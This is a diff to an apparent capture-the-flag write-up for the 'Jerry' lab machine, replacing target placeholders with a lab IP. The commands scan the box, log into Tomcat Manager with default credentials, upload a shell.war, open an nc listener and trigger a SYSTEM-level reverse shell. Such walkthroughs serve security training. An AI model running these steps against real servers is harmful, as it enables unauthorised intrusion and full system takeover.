@@ -6,6 +6,7 @@
 | **OS** | Windows |
 | **Difficulty** | Easy |
 
+| **IP** | `10.129.82.176` |
 ## Synopsis
 
 Jerry is an easy Windows machine and one of the most straightforward boxes on the platform.
@@ -22,8 +23,8 @@ one file on the Administrator desktop.
 ### Nmap
 
 ```bash
-nmap -p- --min-rate=5000 -T4 <target>
-nmap -p8080 -sCV <target>
+nmap -p- --min-rate=5000 -T4 10.129.82.176
+nmap -p8080 -sCV 10.129.82.176
 ```
 
 ```
@@ -33,7 +34,7 @@ PORT     STATE SERVICE VERSION
 
 ### Tomcat Manager
 
-Browsing `http://<target>:8080/` shows the default Tomcat landing page. The **Manager App**
+Browsing `http://10.129.82.176:8080/` shows the default Tomcat landing page. The **Manager App**
 (`/manager/html`) prompts for HTTP Basic auth. Trying Tomcat's well-known default credentials
 works:
 
@@ -58,14 +59,14 @@ Start a listener and deploy the WAR through the Manager (upload `shell.war` unde
 
 ```bash
 curl -u 'tomcat:s3cret' --upload-file shell.war \
-  "http://<target>:8080/manager/text/deploy?path=/shell"
+  "http://10.129.82.176:8080/manager/text/deploy?path=/shell"
 nc -lvnp 4444
 ```
 
 Request the deployed app to trigger the payload:
 
 ```bash
-curl "http://<target>:8080/shell/"
+curl "http://10.129.82.176:8080/shell/"
 ```
 
 Because the Tomcat service runs as **SYSTEM**, the reverse shell is already fully privileged —
